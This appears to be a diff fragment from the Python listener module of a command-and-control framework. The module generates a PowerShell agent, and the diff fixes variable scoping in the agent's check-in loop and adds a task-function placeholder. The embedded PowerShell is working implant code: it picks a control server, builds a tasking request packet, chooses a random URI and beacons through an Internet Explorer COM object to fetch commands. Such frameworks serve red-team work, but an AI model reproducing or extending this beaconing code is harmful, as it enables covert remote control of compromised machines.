@@ -593,7 +593,7 @@ class Listener:
                         $ServerIndex = 0;
 
                         try {{
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -603,7 +603,7 @@ class Listener:
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
-                                $ServerURI = $:ControlServers[$Script:ServerIndex] + $taskURI
+                                $ServerURI = $ControlServers[$ServerIndex] + $taskURI
 
                                 $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
                                 while($Script:IE.busy -eq $true){{Start-Sleep -Milliseconds 100}}
@@ -621,6 +621,7 @@ class Listener:
                             }}
                         }}
                     }}
+                    #TASK_FUNCTION
                 """.format(ControlServers = updateServers,reqheader = listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
